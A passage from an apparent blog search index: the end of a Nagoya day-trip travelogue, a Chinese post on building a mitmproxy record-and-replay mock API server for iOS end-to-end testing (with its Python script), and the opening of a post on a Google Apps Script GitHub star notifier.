Tower)It’s located just below Nagoya Castle, about two stops away; I took a bus to get there after leaving Nagoya Castle.9/11 AM 10:08 — Arrived at Chubu Electric Power MIRAI TOWER (formerly Nagoya TV Tower)The weather was fluctuating between cloudy and sunny; it cleared up when I arrived and turned cloudy again when I left.After buying a ticket, you can go up to the observation deck to overlook Nagoya City (if you just want to go to the café on the middle level, you don’t need to buy a ticket; you can still see some views from the café).The café had a great view, and as it approached 10:30, I started to feel sleepy. I ended up lying down and napping there until after 11 AM; the place had plenty of seating, was quiet, and was perfect for catching up on sleep.Fourth Destination: Oasis 21Oasis 21 is right outside Nagoya Tower, but due to the rain, being a weekday, and it being early in the morning, there wasn’t much to explore, so I just took a quick look around and left.Fifth Destination: Yabaton Yabacho Main StoreAs it approached noon, I thought I would try the famous Nagoya miso pork cutlet. The main store is about one or two stops away from Nagoya Tower, so I decided to walk there.Sixth Destination: Osu Shopping DistrictWhen I arrived, I found a long line and had to wait… Time was precious, and since I was close to the Osu shopping district, I decided to continue walking there to find something to eat.9/11 PM 12:09 — Arrived at Osu Shopping DistrictI walked towards Osu Kannon, and just before reaching it, I found another branch of Shiba’s restaurant and went in to dine.I mindlessly ordered a set meal and realized I made the wrong choice. I mainly wanted to have the miso pork cutlet in the top left corner. The set included miso pork cutlet + fried shishamo + tsukudani + side dishes + soup + rice. The miso pork cutlet was delicious, but there wasn’t enough of it!6th Destination: Osu KannonAs soon as I left the restaurant, I was right at Osu Kannon.9/11 PM 13:05 — Arrived at Osu KannonThe main hall was under renovation, so I just strolled around outside before leaving.If you’re afraid of birds, you might want to skip this place; there are a lot of pigeons outside, and you can buy feed to give them.7th Destination: Atsuta ShrineI walked through the Osu shopping district again and headed back to Meijo Line to go to Atsuta Shrine.On the way, I bought some Benzaiten fruit daifuku to eat. The skin was thin and soft, and the fruit was fresh and juicy. I ended up buying two! (I think they taste better than those from Mizuan XD)I also made a quick stop at a drugstore in the shopping district to pick up some medications I could take back to Taiwan.9/11 PM 13:35 — Arrived at Atsuta ShrineAfter exiting Atsuta Shrine Station on the Meijo Line, I had to walk a bit further to reach the main entrance of the shrine.After a brief visit, I bought some omamori (amulets) and then left.8th Destination: Meitetsu Nagoya for ShoppingThe last stop was to check out Meitetsu (though by this point, I was already quite tired).9/11 PM 14:40 — Arrived at Meitetsu NagoyaAfter browsing the underground shopping area, I headed towards the JR GATE TOWER. I went up to Starbucks on the 15th floor for some free views.Due to the rain, the outdoor seating was closed, and the indoor seating was packed, so I didn’t buy a coffee to sit and enjoy the view; I just took a few photos before heading down to Takashimaya department store. There was a Harbs downstairs, but it required a queue.Across the way was the Sky Promenade, a new observation deck in Nagoya, but I skipped it because I was tired, didn’t want to buy another ticket, and the weather was bad. I checked the time and realized there weren’t any other interesting spots I could visit, so I just wandered down to the underground shopping area to buy some souvenirs (from Kaeru Honke); I also bought a one-way ticket from Nagoya Railway to Chubu Centrair International Airport + uSky train ($271) to head back to the airport.It was still before 5 PM, which was a bit disappointing… but going to other attractions would have been too far… and I wanted to avoid the rush hour crowd.9th Destination: Back to Chubu Centrair International AirportI snapped a photo of the uSky train.9/11 PM 16:44 — Arrived at Terminal 1 of Chubu Centrair International AirportMy flight was at 23:15, so I still had a long wait ahead.I decided to try Nagoya’s famous tebasaki (chicken wings).NGO Airport has plenty to explore, from food and souvenirs to a large observation deck where you can watch planes take off and land up close! (Terminal 1)You could also head to Terminal 2 to check out the free airplane museum (but it was already closed when I got there).There’s also a Lawson and a gacha store here (but they also have operating hours).9/11 PM 19:30 — Dinner at Terminal 1 of Chubu Centrair International AirportFor dinner, I had Nagoya udon at the airport. The specialty noodles from Nagoya are flat.It tasted good, but I accidentally ordered a double main dish… the pork cutlet came with rice XD.After eating, I continued to wait for my flight… waiting for the check-in counter to open (which was at 20:45).9/11 PM 20:45 — Check-in at Terminal 1 of Chubu Centrair International AirportI took a quick break in the corner until around 20:00, then lined up to prepare for departure. United Airlines is quite strict about carry-on luggage; the rule is two pieces under 7 kg each, and they won’t let it slide. I saw someone who simply bought a PS5 to bring back; that seems like a good option for a quick day trip.9/11 PM 21:45 — Duty-Free Shopping and Waiting at Terminal 1 of Chubu Centrair International AirportSince I only had one bag, I could carry another one, so I casually bought a bottle of Dassai 2-go 750 ml to take back to Taiwan. (5,700 yen, which is 100 yen more expensive than in Tokyo).The draft cola is delicious; if you see it in supermarkets or vending machines, you should try it! It’s a collaboration between Suntory and Pepsi, and you can’t find it in Taiwan. It’s made using the method for draft beer, so it has a strong carbonation and isn’t overly sweet. I usually end up throwing away regular cola because it gets too sweet, but I could finish the draft cola! Back to the strict carry-on luggage check with United Airlines, they will check again before boarding to ensure you only have two pieces. If not, they will ask you to split them on the spot or pay extra.9/12 AM 00:09 — Departure from Terminal 1 of Chubu Centrair International AirportDue to a flight delay, my originally scheduled flight at 23:15 was pushed back to 23:50; we didn’t take off until around 00:15.But I was lucky to get a window seat, so I could get some good sleep.When I woke up, I explored the in-flight amenities and discovered the flight information and entertainment options. You can connect to the in-flight Wi-Fi to check them, and you can also order food directly from your phone.Someone ordered something that looked like pork rib chicken noodles, and the whole cabin was filled with a delicious aroma—very tempting.9/12 AM 02:25 — Arrived at Taoyuan International AirportFortunately, since I had a window seat, I managed to catch up on some sleep during the flight; I felt relatively okay.9/12 AM 03:30 — Arrived at my warm home in TaipeiI have to say that transportation in Taiwan is quite inconvenient. The red-eye flight arrived at Taoyuan Airport; I had to take a terrifying flat-rate taxi or an expensive Uber back to Taipei. If I wanted to use public transport, I would have to wait for the early morning buses at around 4–5 AM.Purpose of This Trip: To Explore Nagoya Castle, One of the Three Great CastlesI later found out that there’s also Inuyama Castle in Nagoya, which I would have liked to visit. If I could rearrange my itinerary, I would probably prioritize Inuyama Castle, and I also missed out on trying unagi rice!KKday Promotions [Ghibli Park Premium Tickets &amp; Nagoya Hotel Accommodation Guaranteed Entry](https://www.kkday.com/zh-tw/product/139872-ghibli-park-ticket-nagoya-hotel-accommodation-admission-guaranteed-nagoya-japan?cid=19365){:target=”_blank”} [Japan JR PASS Takayama &amp; Hokuriku Area Tourist Pass Multi-Country Shipping](https://www.kkday.com/zh-tw/product/20259-japan-takayama-hokuriku-area-tourist-pass?cid=19365){:target=”_blank”} [**Chubu Centrair International Airport NGO ⇆ Nagoya Station Meitetsu Airport Limited Express Train E-Ticket**](https://www.kkday.com/zh-tw/product/20418-chubu-centrair-international-airport-express-train-transfer-to-nagoya?cid=19365){:target=”_blank”} [LEGOLAND Japan Tickets Nagoya LEGOLAND](https://www.kkday.com/zh-tw/product/11413-nagoya-legoland-japan-e-ticket?cid=19365){:target=”_blank”} If you found this article helpful, feel free to use my referral link to purchase KKday products and tours. I will earn a small commission, which helps me continue creating more travel content. Thank you!More Travelogues [Travelogue] 2024 San’in Region (Part 1) Shimane, Izumo, Matsue, Tottori, Himeji, Osaka, Kobe 7-Day Solo Trip [Travelogue] 2024 Second Visit to Kyushu 9-Day Free Trip, Entering via Busan → Hakata Cruise [Travelogue] 2023 Hiroshima and Okayama 6-Day Free Trip [Travelogue] 2023 Kyushu 10-Day Solo Travel [Travelogue] 2023 Tokyo 5-Day Free Trip [Travelogue] 2023 Kansai Region 8-Day Free TripIf you have any questions or suggestions, feel free to contact me.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.If you found this article helpful, feel free to use my referral link to purchase KKday products and tours. I’ll receive a small commission to support more travel content. Thank you! Follow Me on Medium 1K+ Followers 7,400 Total Views Last Statistics Date: 2025-08-15 | 6,880 Views on Medium." }, { "title": "POC App End-to-End Testing Local Snapshot API Mock Server", "url": "/posts/zrealm-dev/poc-app-end-to-end-testing-local-snapshot-api-mock-server-5a5c4b25a83d/", "categories": "ZRealm Dev.", "tags": "ios-app-development, end-to-end-testing, ui-testing, automation-testing, ios", "date": "2023-08-28 22:53:27 +0800", "snippet": "[POC] App End-to-End Testing Local Snapshot API Mock Server為現成 App 及現有 API 架構實現 E2E Testing 的可能性驗證Photo by freestocks前言作為一個已在線上運作多年的專案，如何持續提升穩定性是一件極具挑戰的問題。Unit TestingApp 因開發語言 Swift/Kotlin 靜態+編譯+強...", "content": "[POC] App End-to-End Testing Local Snapshot API Mock Server為現成 App 及現有 API 架構實現 E2E Testing 的可能性驗證Photo by freestocks前言作為一個已在線上運作多年的專案，如何持續提升穩定性是一件極具挑戰的問題。Unit TestingApp 因開發語言 Swift/Kotlin 靜態+編譯+強型別 或 Objective-C to Swift 動態轉靜態，在開發時沒考慮到可測試性把介面依賴切乾淨，後面要補 Unit Testing 幾乎不可能；但在重構的過程也會帶來不穩定因素，會陷入一個雞生蛋蛋生雞問題。UI Testing對 UI 交互、按鈕測試；新開發或舊有的畫面稍微解耦資料依賴就可以實現。SnapShot Testing驗證調整前後的 UI 顯示內容、樣式是否一致；同 UI Testing，新開發或舊有的畫面稍微解耦資料依賴就可以實現。用在 Storyboard/XIB 轉 Code Layout or UIView from OC to Swift 很實用；可以直接導入 pointfreeco / swift-snapshot-testing 快速實現。雖然我們可以後期補上 UI Testing、SnapShot Testing，但能涵蓋的測試範圍很有限；因為多半的錯誤不會是 UI 樣式，而是流程或是邏輯問題，導致使用者中斷操作， 如果出現在結帳流程，牽涉到營收，問題層級就很嚴重 。End-to-End Testing如前述，無法在現行專案簡易的補上單元測試也無法聚攏單元做整合測試，對於邏輯、流程的防護，還剩下從外部做 End-to-End 黑箱測試的方法，直接以使用者角度出發，操作流程檢查重要的流程(註冊/結帳…)是否正常。 對重大功能的重構也能先建立重構前的流程測試，重構後重新驗證，確保重構後功能如預期。 重構中一併補上 Unit Testing、Integration Testing 增加穩定性，打破雞生蛋蛋生雞的問題。QA TeamEnd-to-End Testing 最直接暴力的方式就是請一組 QA Team 依照 Test Plan 進行手動測試，然後再持續優化或引入自動化操作；計算了一下成本至少需要 2 位工程師 + 1 位 Leader 花費至少半年一年時間才能看到成果。評估時間與成本，有沒有什麼是現況我們能做的或是能為未來 QA Team 做好準備，當有 QA Team 時能直接跳到優化與自動化操作甚至導入 AI(?)。Automation現階段以導入自動化 End-to-End Testing 為目標，放在 CI/CD 環節自動檢查，測試內容可以不用太完整、只要能防止重大流程問題就已經很有價值了；後面再慢慢迭代 Test Plan 逐步補齊守備範圍。End-to-End Testing —技術難點UI 操作問題App 的原理比較像是透過另一個測試 App 去操作我們的被測試 App，然後從 View Hierarchy 去找尋目標物件；並且在測試時無法取得被測試 App 的 Log 或 Output，因為本質上就是兩個不同 App。iOS 需要完善 View Accessibility Identifier 增加效率與準確性還有要處理 Alert (e.g. 推播請求)。Android 在之前的實作上有遇到混用 Compose 與 Fragment 時會找不到目標物件的問題，但據 Teammate 表示，新版的 Compose 已經解決。除以上傳統常見問題外，更大的問題是雙平台難以整合(寫一個測試跑兩個平台)；目前我們在嘗試使用新的測試工具 mobile-dev-inc / maestro ：可以用 YAML 寫 Test Plan 然後在雙平台執行測試，細節使用方式、試用心得，靜待另一位 Teammate 的文章分享 cc’ed Alejandra Ts. 😝。API 資料問題對於 App E2E Testing 最大的測試變量就是 API 資料，如果無法提供保證確定的資料，會增加測試的不穩定性，導致誤報，最後大家對 Test Plan 也不再有信心了。例如測試結帳流程，如果商品有可能被下架或消失，且這些狀態改變不是 App 可控的就很有可能出現以上狀況。解決資料問題的方式有很多種，可以建立乾淨的 Staging 或 Testing 環境；或是基於 Open API 的 Auto-Gen Mock API Server；但都需要依賴後端、依賴 API 的外部因素，加上後端 API 同 App 一樣是在線上運作多年的專案，部份規格也還在重構 Migrate 暫時無法有 Mock Server。基於以上因素，如果就卡在這，那問題一樣不會改變、雞生蛋蛋生雞問題也無法突破，真的就只能「挺而走險」的直接先改、出問題再說了。Snapshot API Local Mock Server 「只要思想不滑坡，方法總比困難多」我們可以換一個想法，如果 UI 可以用 Snapshot 快照成圖片下來 Replay 進行驗證測試，那 API 是否也可以？ 我們是否可以把 API Request &amp; Response 存下來，在後續 Replay 進行驗證測試？藉此引入本篇文章的重點：建立「Snapshot API Local Mock Server」Record API Request &amp; Replay Response 剝離與 API 資料的依賴。 本文只做了 POC 概念驗證，還沒有真正全面實現高覆蓋率的 End To End Testing，因此做法僅供參考， 希望對大家在現有環境下有新的啟發 。Snapshot API Local Mock Server核心概念 — Record &amp; Replay API Data[Record] — End-to-End Testing Test Case 開發完成後，打開錄製參數，執行一次測試，過程中所有 API Request &amp; Response 會存下來放在各個 Test Case 目錄內。[Replay] — 後面在跑 Test Case 時，依照請求從 Test Case 目錄中找到對應錄製下來的 Response Data，完成測試流程。示意圖假設我們要測試加入購買流程，使用者打開 App 後在首頁點擊商品卡進入商品詳細頁，按底部購買，跳出登入匡完成登入，完成購買，跳出購買成功提示：UI Testing 如何控制按鈕點擊、輸入匡輸入…等等，不是本文主要研究重點；可參考現有的測試框架直接使用。Regular Proxy or Reverse Proxy要達成 Record &amp; Replay API 需要在 App 與 API 之間加上 Proxy 做中間人攻擊，可參考我早期的文章「 APP有用HTTPS傳輸，但資料還是被偷了。 」簡單來說就是在 App 與 API 之間多了一個代理的傳遞者，如同傳紙條一樣，雙方傳遞的請求與回應都會經過他，他可以打開來紙條的內容，也可以偽造紙條內容給彼此，雙方不會察覺你從中做梗。正向代理 Regular Proxy：正向代理是客戶端向代理伺服器發送請求，代理伺服器再將請求轉發給目標伺服器，並將目標伺服器的回應返回給客戶端。在正向代理模式下，代理伺服器代表客戶端發起請求。客戶端需要明確指定代理伺服器的位址和埠號，並將請求發送給代理伺服器。反向代理 Reverse Proxy：反向代理與正向代理相反，它位於目標伺服器和客戶端之間。客戶端向反向代理伺服器發送請求，反向代理伺服器根據一定的規則將請求轉發給後端的目標伺服器，並將目標伺服器的回應返回給客戶端。對於客戶端來說，目標伺服器看起來就像是反向代理伺服器，客戶端不需要知道目標伺服器的真實位址。對我們的需求來說正向或反向都可以達成目的，唯一要考慮的事是代理設置的方式：正向代理需要在電腦上或手機、模擬起的網路設置中掛上 Proxy 代理： Android 能在模擬器中個別直接設置 Proxy 代理 iOS Simulator 同電腦的網路環境，無法個設置 Proxy，變成要去改電腦的設置才能掛上 Proxy，電腦的所有流量也都會經過這個 Proxy 並且如果同時開啟 Proxyman 或 Charles 等等其他網路工具，有機會會強制更改 Proxy 設置成該軟體的，導致失效。反向代理需要改 Codebase 中的 API Host 並且要宣告要代理的所有 API Domains： Codebase 中的 API Host 要在測試時替換成 Proxy Server IP 在啟用 Reverse Proxy 時要宣告哪些 Domain 要掛上 Proxy 只有宣告的 Domain 才會走 Proxy，沒宣告的會直通出去 配合 iOS App，以下以 iOS &amp; 使用 Reverse Proxy 反向代理為例做 POC，Android 一樣可以使用。讓 iOS App 知道現在正在跑 End-to-End Testing我們需要讓 App 知道現在正在跑 End-to-End Testing 才能在 App 程式裡加上 API Host 替換邏輯：// UI Testing Target:let app = XCUIApplication()app.launchArguments = [\"duringE2ETesting\"]app.launch()我們在 Network 層做判斷抽換。 這是不得已的調整，盡量還是不要為了測試而去改 App 的 Code。使用 MITMProxy 實現 Reverse Proxy Server 亦可使用 Swift 自行開發 Swift Server 達成，本文只是 POC 因此直接使用 MITMProxy 工具。[2023–09–04 Update] Mitmproxy-rodo 已開源以下實作內容已經開源到 mitmproxy-rodo 專案，歡迎直接前往對照使用。部份結構與本文章內容有所調整，開源時後續調整了： 儲存目錄的結構，改為 host / requestPath / method / hash 修正 Header 資訊儲存，應該為 Bytes Data 而非純 JSON String 修正部份錯誤 增加自動延長 Set-Cookie 時效功能 ⚠️ 以下腳本僅共 Demo 參考，後續腳本調整將移至開源專案維護。 ⚠️ 以下腳本僅共 Demo 參考，後續腳本調整將移至開源專案維護。 ⚠️ 以下腳本僅共 Demo 參考，後續腳本調整將移至開源專案維護。 ⚠️ 以下腳本僅共 Demo 參考，後續腳本調整將移至開源專案維護。 ⚠️ 以下腳本僅共 Demo 參考，後續腳本調整將移至開源專案維護。MITMProxy照著 MITMProxy 官網 完成安裝：brew install mitmproxyMITMProxy 細節用法可參考我早期的文章「 APP有用HTTPS傳輸，但資料還是被偷了。 」 mitmproxy 提供一個互動式的命令行界面。 mitmweb 提供基於瀏覽器的圖形用戶界面。 mitmdump 提供非互動的終端輸出。實現 Record &amp; Replay因 MITMProxy Reverse Proxy 原生沒有 Record (or dump) request &amp; Mapping Request Replay 的功能，因此我們需要自行撰寫腳本實現此功能。mock.py :\"\"\"Example: Record: mitmdump -m reverse:https://yourapihost.com -s mock.py --set record=true --set dumper_folder=loginFlow --set config_file=config.json Replay: mitmdump -m reverse:https://yourapihost.com -s mock.py --set dumper_folder=loginFlow --set config_file=config.json\"\"\"import reimport loggingimport mimetypesimport osimport jsonimport hashlibfrom pathlib import Pathfrom mitmproxy import ctxfrom mitmproxy import httpclass MockServerHandler: def load(self, loader): self.readHistory = {} self.configuration = {} loader.add_option( name=\"dumper_folder\", typespec=str, default=\"dump\", help=\"Response Dump 目錄，可以 by Test Case Name 建立\", ) loader.add_option( name=\"network_restricted\", typespec=bool, default=True, help=\"本地沒有 Mapping 資料...設置 true 會 return 404、false 會去打真實請求拿資料。\", ) loader.add_option( name=\"record\", typespec=bool, default=False, help=\"設置 true 錄製 Request's Response\", ) loader.add_option( name=\"config_file\", typespec=str, default=\"\", help=\"設置檔案路徑，範例檔案在下面\", ) def configure(self, updated): self.loadConfig() def loadConfig(self): configFile = Path(ctx.options.config_file) if ctx.options.config_file == \"\" or not configFile.exists(): return self.configuration = json.loads(open(configFile, \"r\").read()) def hash(self, request): query = request.query requestPath = \"-\".join(request.path_components) ignoredQueryParameterByPaths = self.configuration.get(\"ignored\", {}).get(\"paths\", {}).get(request.host, {}).get(requestPath, {}).get(request.method, {}).get(\"queryParamters\", []) ignoredQueryParameterGlobal = self.configuration.get(\"ignored\", {}).get(\"global\", {}).get(\"queryParamters\", []) filteredQuery = [] if query: filteredQuery = [(key, value) for key, value in query.items() if key not in ignoredQueryParameterByPaths + ignoredQueryParameterGlobal] formData = [] if request.get_content() != None and request.get_content() != b'': formData = json.loads(request.get_content()) # or just formData = request.urlencoded_form # or just formData = request.multipart_form # depends on your api design ignoredFormDataParametersByPaths = self.configuration.get(\"ignored\", {}).get(\"paths\", {}).get(request.host, {}).get(requestPath, {}).get(request.method, {}).get(\"formDataParameters\", []) ignoredFormDataParametersGlobal = self.configuration.get(\"ignored\", {}).get(\"global\", {}).get(\"formDataParameters\", []) filteredFormData = [] if formData: filteredFormData = [(key, value) for key, value in formData.items() if key not in ignoredFormDataParametersByPaths + ignoredFormDataParametersGlobal] # Serialize the dictionary to a JSON string hashData = {\"query\":sorted(filteredQuery), \"form\": sorted(filteredFormData)} json_str = json.dumps(hashData, sort_keys=True) # Apply SHA-256 hash function hash_object = hashlib.sha256(json_str.encode()) hash_string = hash_object.hexdigest() return hash_string def readFromFile(self, request): host = request.host method = request.method hash = self.hash(request) requestPath = \"-\".join(request.path_components) folder = Path(ctx.options.dumper_folder) / host / method / requestPath / hash if not folder.exists(): return None content_type = request.headers.get(\"content-type\", \"\").split(\";\")[0] ext = mimetypes.guess_extension(content_type) or \".json\" count = self.readHistory.get(host, {}).get(method, {}).get(requestPath, {}) or 0 filepath = folder / f\"Content-{str(count)}{ext}\" while not filepath.exists() and count &gt; 0: count = count - 1 filepath = folder / f\"Content-{str(count)}{ext}\" if self.readHistory.get(host) is None: self.readHistory[host] = {} if self.readHistory.get(host).get(method) is None: self.readHistory[host][method] = {} if self.readHistory.get(host).get(method).get(requestPath) is None: self.readHistory[host][method][requestPath] = {} if filepath.exists(): headerFilePath = folder / f\"Header-{str(count)}.json\" if not headerFilePath.exists(): headerFilePath = None count += 1 self.readHistory[host][method][requestPath] = count return {\"content\": filepath, \"header\": headerFilePath} else: return None def saveToFile(self, request, response): host = request.host method = request.method hash = self.hash(request) requestPath = \"-\".join(request.path_components) iterable = self.configuration.get(\"ignored\", {}).get(\"paths\", {}).get(request.host, {}).get(requestPath, {}).get(request.method, {}).get(\"iterable\", False) folder = Path(ctx.options.dumper_folder) / host / method / requestPath / hash # create dir if not exists if not folder.exists(): os.makedirs(folder) content_type = response.headers.get(\"content-type\", \"\").split(\";\")[0] ext = mimetypes.guess_extension(content_type) or \".json\" repeatNumber = 0 filepath = folder / f\"Content-{str(repeatNumber)}{ext}\" while filepath.exists() and iterable == False: repeatNumber += 1 filepath = folder / f\"Content-{str(repeatNumber)}{ext}\" # dump to file with open(filepath, \"wb\") as f: f.write(response.content or b'') headerFilepath = folder / f\"Header-{str(repeatNumber)}.json\" with open(headerFilepath, \"wb\") as f: responseDict = dict(response.headers.items()) responseDict['_status_code'] = response.status_code f.write(json.dumps(responseDict).encode('utf-8')) return {\"content\": filepath, \"header\": headerFilepath} def request(self, flow): if ctx.options.record != True: host = flow.request.host path = flow.request.path result = self.readFromFile(flow.request) if result is not None: content = b'' headers = {} statusCode = 200 if result.get('content') is not None: content = open(result['content'], \"r\").read() if result.get('header') is not None: headers = json.loads(open(result['header'], \"r\").read()) statusCode = headers['_status_code'] del headers['_status_code'] headers['_responseFromMitmproxy'] = '1' flow.response = http.Response.make(statusCode, content, headers) logging.info(\"Fullfill response from local with \"+str(result['content'])) return if ctx.options.network_restricted == True: flow.response = http.Response.make(404, b'', {'_responseFromMitmproxy': '1'}) def response(self, flow): if ctx.options.record == True and flow.response.headers.get('_responseFromMitmproxy') != '1': result = self.saveToFile(flow.request, flow.response) logging.info(\"Save response to local with \"+str(result['content']))addons = [MockServerHandler()]可以自行參考 官方文件 ，依照需求調整腳本內容。此腳本設計邏輯如下： 檔案路徑邏輯： dumper_folder(a.k.a Test Case Name) / Reverse's api host / HTTP Method / Path join with - (e.g. app/launch -&gt; app-launch ) / Hash(Get Query &amp; Post Content) / 檔案邏輯：回應的內容： Content-0.xxx 、 Content-1.xxx (同個請求打第二次)…以此類推；回應的 Header 資訊： Header-0.json (同 Content-x 邏輯) 儲存時會依照路徑、檔案邏輯依序儲存；在 Replay 時同樣依序取出 如果次數不匹配，例如 Replay 時同個路徑打了 3 次，但 Record 儲存的資料只存到第 2 次；則還是會持續回應第 2 次，也就是最後一次的結果 record 為 True 時，會去打目標 Server 取得回應並依照上述邏輯儲存下來； False 時則只會從本地讀資料 (等於 Replay Mode) network_restricted 為 False 時，本地沒 Mapping 資料會直接回應 404 ；為 True 時會去打目標 Server 拿資料。 _responseFromMitmproxy 用於告知 Response Method 當前回應來自 Local，可以忽略不管、 _status_code 借用 Header.json 欄位儲存 HTTP Response 狀態碼。config_file.json 設置檔案邏輯設計如下：{ \"ignored\": { \"paths\": { \"yourapihost.com\": { \"add-to-cart\": { \"POST\": { \"queryParamters\": [ \"created_timestamp\" ], \"formDataParameters\": [] } }, \"api-status-checker\": { \"GET\": { \"iterable\": true } } } }, \"global\": { \"queryParamters\": [ \"timestamp\" ], \"formDataParameters\": [] } }}queryParamters &amp; formDataParameters :因部分 API 參數可能會隨呼叫改變，例如有的 Endpoint 會帶上時間參數，此時依照 Server 的設計， Hash(Query Parameter &amp; Body Content) 的值就會在 Replay Request 時不一樣，導致 Mapping 不到 Local Response，因此多開了一個 config.json 處理這個情況，可以 by Endpoint Path or Global 設定某個參數應該在排除 Hash 時排除，就能取得同樣的 Mapping 結果。iterable :因部分輪詢檢查的 API 可能會重複定時不斷呼叫，照 Server 的設計會產出很多 Content-x.xxx &amp; Header-x.json 檔案；但假設我們不在意則可設定為 True ，Response 會持續儲存覆蓋到 Content-0.xxx &amp; Header-0.json 第一個檔案內。啟用 Reverse Proxy Record Mode：mitmdump -m reverse:https://yourapihost.com -s mock.py --set record=true --set dumper_folder=loginFlow --set config_file=config.json啟用 Reverse Proxy Replay Mode：mitmdump -m reverse:https://yourapihost.com -s mock.py --set dumper_folder=loginFlow --set config_file=config.json組裝 &amp; Proof Of Concept0. 完成 Codebase 中 Host 的抽換並確認在跑測試時，API 已改用 http://127.0.0.1:80801. 啟動 Snapshot API Local Mock Server (a.k.a Reverse Proxy Server) Record Modemitmdump -m reverse:https://yourapihost.com -s mock.py --set record=true --set dumper_folder=addCart --set config_file=config.json2. 執行 E2E Testing UI 操作以 Pinkoi iOS App 為例，測試以下流程： Launch App -&gt; Home -&gt; Scroll Down -&gt; Similar to Wish List Items Section -&gt; First Product -&gt; Click First Product -&gt; Enter Product Page -&gt; Click Add to Cart -&gt; UI Response Added to Cart -&gt; Test Successful ✅UI 自動化操作方式前面有提到，這邊先手動測試相同的流程驗證結果。3. 取得 Record 結果操作完成後可以下 ^ + C 終止 Snapshot API Mock Server，到檔案目錄查看錄製結果：4. Replay 驗證同個流程，啟動 Server &amp; Using Replay Modemitmdump -m reverse:https://yourapihost.com -s mock.py --set dumper_folder=addCart --set config_file=config.json5. 再次執行剛剛的 UI 操作驗證結果 左：Test Successful ✅ 右：測試點擊錄製以外的商品，此時會出現 Error (因本地沒資料 + network_restricted 預設是 False 本地沒資料直接傳 404，不會從網路拿資料)6. Proof Of Concept ✅概念驗證通過，我們確實能透過實現 Reverse Proxy Server 來自行儲存 API Request &amp; Response 並作為 Mock API Server 在測試時回應資料給 App 🎉🎉🎉。[2023–09–04] mitmproxy-rodo 已開源後續和雜記本文只探討了概念驗證，後續還有許多地方要補齊也還有更多功能可以實現。 與 maestro UI Testinga 工具整合 CI/CD 流程整合設計 (怎麼自動起 Reverse Proxy? 起在哪裡? ) 怎麼把 MITMProxy 封裝在開發工具內? 驗證更複雜的測試場景 針對發送的 Tracking Request 做驗證，需多實現存 Request Body，然後從中取得打了哪些 Tracking Event Data、是否符合流程該送的事件Cookie 問題#... def response(self, flow): setCookies = flow.response.headers.get_all(\"set-cookie\") # setCookies = ['ad=0; Domain=.xxx.com; expires=Wed, 23 Aug 2023 04:59:07 GMT; Max-Age=1800; Path=/', 'sessionid=xxxx; Secure; HttpOnly; Domain=.xxx.com; expires=Wed, 23 Aug 2023 04:59:07 GMT; Max-Age=1800; Path=/'] # OR Replace Cookie Domain From .xxx.com To 127.0.0.1 setCookies = [re.sub(r\"\\s*\\.xxx\\.com\\s*\", \"127.0.0.1\", s) for s in setCookies] # AND 移除安全性相關限制 setCookies = [re.sub(r\";\\s*Secure\\s*\", \"\", s) for s in setCookies] setCookies = [re.sub(r\";\\s*HttpOnly;\\s*\", \"\", s) for s in setCookies] flow.response.headers.set_all(\"Set-Cookie\", setCookies) #...如果有遇到 Cookie 方面的問題，例如 API 有回應 Cookie 但 App 沒接到，可參考以上的調整。在 Pinkoi 的最後一篇文章在 Pinkoi 900 多天的日子裡，實現了許多我職涯上還有 iOS / App 開發、流程的想像，感謝所有隊友，一起走過疫情、經歷風雨；告別的勇氣如同當初追尋夢想入職的勇氣。 正在啟航找尋新的人生挑戰(包括但不限於工程)，如果您有合適的機會（iOS or 工程管理 or 新創產品）歡迎與我聯絡。 🙏🙏🙏有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 621 Total Views Last Statistics Date: 2025-08-15 | 597 Views on Medium." }, { "title": "使用 Google Apps Script 三步驟免費建立 Github Repo Star Notifier", "url": "/posts/zrealm-dev/%E4%BD%BF%E7%94%A8-google-apps-script-%E4%B8%89%E6%AD%A5%E9%A9%9F%E5%85%8D%E8%B2%BB%E5%BB%BA%E7%AB%8B-github-repo-star-notifier-382218e15697/", "categories": "ZRealm Dev.", "tags": "ios-app-development, google-app-script, github, notifications, stars", "date": "2023-08-01 22:32:14 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.使用 Google Apps Script 三步驟免費建立 Github Repo Star Notifier撰寫 GAS 串接 Github Webhook 轉發按星星 Like 通知到 Line前言身為開源專案的維護者，不...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.使用 Google Apps Script 三步驟免費建立 Github Repo Star Notifier撰寫 GAS 串接 Github Webhook 轉發按星星 Like 通知到 Line前言身為開源專案的維護者，不為錢不為名，只為一個 虛榮心 ；每當看到有新的 ⭐️ 星星時，心中都竊喜不已；花時間花精力做的專案真的有人在用、真的有幫助的有同樣問題的朋友。Star History Chart因此對 ⭐️ 星星的觀測多少有點強迫症，時不時就刷一下 Github 查看 ⭐️星星 數有沒有增加；我就在想有沒有更主動一點的方式，當有人 按 ⭐️星星 時主動跳通知提示，不需要手動追蹤查詢。現有工具首先考慮尋找現有工具達成，到 Github Marketplace 搜尋了一下，有幾個大神做好的工具可以使用。試了其中幾個效果不如預期，有的已不在運作、有的只能在每 5/10/20 個 ⭐️星星 時發送通知(我只是小小，有 1 個新的 ⭐️ 就很開心了😝)、通知只能發信件但我想要用 SNS 通知。再加上只是為了「虛榮心」裝一個 App，心裡不太踏實，怕有資安風險問題。iOS 上的 Github App 或 GitTrends …等等第三方 App 也都不支援此功能。自己打造 Github Repo Star Notifier基於以上，其實我們可以直接用 Google Apps Script 免費、快速打造自己的 Github Repo Star Notifier。2024/10/12 Update ⚠️⚠️⚠️ 因 Line Notify 將於 2025/04/01 關閉 ，請參考 我的最新文章「 10 分鐘快速移轉 Line Notify 到 Telegram Bot 通知 」 改使用 Telegram 串接通知功能。準備工作本文以 Line 做為通知媒介，如果你想使用其他通訊軟體通知可以詢問 ChatGPT 如何實現。詢問 ChatGPT 如何實現 Line NotifylineToken ： 前往 Line Notify 登入你的 Line 帳號之後拉到底找到「Generate access token (For developers)」區 點擊「Generate token」 Token Name：輸入你想要的機器人頭銜名稱，會顯示在訊息之前 (e.g. Github Repo Notifer: XXXX ) 選擇訊息要傳送到的地方：我選擇 1-on-1 chat with LINE Notify 透過 LINE Notify 官方機器人發送訊息給自己。 點擊「Generate 